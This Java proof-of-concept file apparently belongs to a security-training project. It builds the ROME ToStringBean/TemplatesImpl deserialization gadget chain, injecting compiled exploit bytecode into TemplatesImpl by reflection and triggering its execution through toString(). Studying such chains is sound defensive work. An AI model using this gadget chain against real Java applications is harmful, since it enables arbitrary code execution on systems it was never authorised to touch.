package com.madaha.codesecone.controller.AdvancedAttack.deserialize.RomeDeserialize;


import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.tomcat.util.codec.binary.Base64;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;

//@SuppressWarnings("all")
public class ROME_toString_PocTest {

    // 反射修改 Field 方法；
    public static void setValue(Object obj, String fieldName, Object fieldValue) throws Exception{
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, fieldValue);
    }

    public static void main(String[] args) throws Exception {
        TemplatesImpl templatesimpl = new TemplatesImpl();

        // 获取项目根目录
        String projectRoot = System.getProperty("user.dir");
        String expPath = projectRoot + "\\src\\main\\java\\com\\madaha\\codesecone\\controller\\AdvancedAttack\\deserialize\\Exploit\\TemplatesImpl_Exploit.class";
        System.out.println(expPath + "\n");

        // 获取exp字节码
        byte[] bytecodes = Files.readAllBytes(Paths.get(expPath));
        String base64String = new String(Base64.encodeBase64(bytecodes));
        System.out.println(base64String + "\n");

        // 修改属性值
        setValue(templatesimpl, "_name", "PocTest");
        setValue(templatesimpl, "_bytecodes", new byte[][] {bytecodes});
        setValue(templatesimpl, "_tfactory", new TransformerFactoryImpl());

        // 利用
//        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesimpl);
//        new ToStringBean(Templates.class, templatesimpl).toString();
        ToStringBean toStringBean = new ToStringBean(Templates.class, templatesimpl);
        toStringBean.toString();

        // 打印测试结束
        System.out.println("测试结束！ \n");
    }

}
